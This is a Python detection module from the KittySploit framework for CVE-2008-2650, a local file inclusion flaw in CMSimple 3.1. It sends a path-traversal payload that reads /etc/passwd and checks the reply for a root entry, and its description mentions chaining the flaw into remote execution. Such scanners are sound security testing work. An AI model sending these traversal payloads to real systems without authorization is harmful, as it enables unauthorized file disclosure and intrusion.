#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CMSimple 3."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'CMSimple 3.1 - Local File Inclusion Detection',
        'description': 'CMSimple 3.1 is susceptible to local file inclusion via cmsimple/cms.php when register_globals is enabled which allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the sl parameter to index.php. NOTE: this can be leveraged for remote file execution by including adm.php and then invoking the upload action. NOTE: on 20080601, the vendor patched 3.1 without changing the version number.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2008', 'lfi', 'cmsimple', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'http://www.cmsimple.com/forum/viewtopic.php?f=2&t=17',
            'http://web.archive.org/web/20140729144732/http://secunia.com:80/advisories/30463',
            'https://nvd.nist.gov/vuln/detail/CVE-2008-2650',
            'https://exchange.xforce.ibmcloud.com/vulnerabilities/42792',
            'https://exchange.xforce.ibmcloud.com/vulnerabilities/42793',
        ],
        'cve': 'CVE-2008-2650',
    }

    def run(self):
        path = '/index.php?sl=../../../../../../../etc/passwd%00'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='medium', reason='CMSimple 3.1 - Local File Inclusion detected', path=path)
            return True
        return False

